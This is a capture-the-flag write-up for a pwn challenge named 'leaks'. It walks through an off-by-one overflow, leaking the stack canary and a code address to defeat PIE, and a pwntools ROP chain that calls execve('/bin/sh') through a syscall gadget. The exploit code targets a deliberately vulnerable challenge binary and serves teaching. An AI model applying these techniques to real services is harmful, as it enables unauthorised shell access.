# Goodbye Mr. Anderson 'leaks' Writeup

This challenge distributes a binary called 'leaks' that reads input 4 times, once into a buffer in the BSS called 'name', and 3 more times into a buffer on the stack with a size of 24 bytes, which are echoed back.

```c
char name[16];

...

int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    char buffer[24];

    printf("You hear that, Mr. Anderson? That's the sound of inevitability, that's the sound of your death, goodbye, Mr. Anderson.\n");

    leak_stack_canary(name, 16);

    leak_stack_canary(buffer, 64);
    printf("%s\n", buffer);
    leak_stack_canary(buffer, 64);
    printf("%s\n", buffer);
    leak_stack_canary(buffer, 128);
    printf("%s\n", buffer);
}
```

If we take the hint from the function name, we know that we will likely need to be leaking the stack canary in this challenge. Let's start by running `checksec` on the distributed binary to determine the protections.

```
━━┫  checksec leaks
[*] '/home/leaks/leaks'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

This binary has full protections, which means that we will in fact need to leak the stack canary, and we will also need to leak either the address of libc or the code segment, since PIE (position independent execution) is enabled.

The `leak_stack_canary` function is as follows:

```c
char * leak_stack_canary(char * buffer, int maxlen) {
    int length;

    scanf("%d", &length);
    if (length > maxlen) {
        exit(13);
    }

    fgetc(stdin);

    for (int i = 0; i <= length; i++) {
         buffer[i] = fgetc(stdin);
    }

    return buffer;
}
```

This simply reads a chosen number of bytes, as long as it is less than the max length. This means that we have a buffer overflow each of the 3 times that over 24 bytes are read.

We can test this by sending a large number of 'A's in gdb and expecting a crash at the end of main, which does in fact happen. That crash, however, is not a segmentation fault, it is a stack canary error.

We need to know the value of the stack canary to overwrite the existing one with it. Since the stack canary comes right after our input, if we can prevent a null byte from being placed at the end of our input, we can read the bytes following it.

```python
p.sendline(b'8')
p.sendline(b'AAAAAAAA') # 'name'

p.sendline(b'24')
p.send(b'A' * 24 + b'\n') # 'buffer'
p.recvline()
p.recvline()

stack_canary = u64(b'\x00' + p.recvline()[:7])
print(hex(stack_canary))
```

A couple things to note about the above stack canary leak.
 1) The newline sent is included, since a `<=` is used in the for loop
 2) Stack canaries start with a `\x00` (null) byte to help prevent leaks. We clobber that byte with the newline, so we need to reinsert it when we leak the canary.

Now that we have the stack canary, we can cause a segmentation fault and jump to wherever we want!

But we're not done. For one, PIE is enabled, so we don't know any addresses to jump to.

However, as it turns out, we can use the same approach that we used to leak the stack canary to leak the return address. And we should be able to calculate any address in the binary from the return address.

```python
binary = ELF('./leaks')
...

p.sendline(b'8')
p.send(b'A' * 8 + b'\x0a')
p.recvline()
return_addr = u64((b'\x00' + p.recvline()[0:5]).ljust(8, b'\x00'))
base = return_addr - binary.symbols['_start']
print(hex(base))
```

This requires a shorter buffer, and technically isn't leaking the return address. It is leaking the address of `_start`, which was left over by some previously executed function in libc. Since it requires a shorter buffer, it will happen before the stack canary leak.

Now that we have the address of the code section, we can build a ropchain. There is no `call system` gadget directly provided, but we could leak the address of another function in libc (such as printf), and calculate the address of system from that. Another alternative would be to use the provided `syscall` gadget.

```c
void yay() {
    asm("pop %rax");
    asm("syscall");
    return;
}
```

If we call `SYS_execve` by setting `rax` to 59, and correctly setting other arguments, we should be able to execute `/bin/sh`. If we look at the table [here](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md), we can see the arguments expected.

Arguments: `rax` should be 59, `rdi` sohuld be a pointer to `"/bin/sh\x00"`, and `rsi` should be `NULL` or `0`.

There is no simple `pop rsi; ret` gadget, but the gadget `pop rsi; pop r15; ret` exists, which is good enough for us.

The last problem that we have before we can fully assemble the ropchain is that we don't have the address to `"/bin/sh\x00"` anywhere. We do have the address of one of our inputs however. Since `name` is in the BSS, we can calculate its address from the return address leak. If we set `"/bin/sh\x00"` as our name, we can use that address in our ropchain.

At this point, all that is left is assembling the ropchain:
```python
name_addr = base + binary.symbols['name']
rop = ROP(binary)
pop_rsi_pop_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address + base
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address + base
pop_rax_syscall = rop.find_gadget(['pop rax', 'syscall']).address + base

ropchain = b''
# clear rsi
ropchain += p64(pop_rsi_pop_r15)  # pop rsi; pop r15, ret
ropchain += p64(0)  # rsi
ropchain += p64(0)  # r15

# set rdi addr("/bin/sh")
ropchain += p64(pop_rdi)  # pop rdi; ret
ropchain += p64(name_addr)  # rdi

# syscall
ropchain += p64(pop_rax_syscall)  # pop rax; syscall
ropchain += p64(59)  # rax (sys_execve)
```

The full solve is available in `solve.py`.
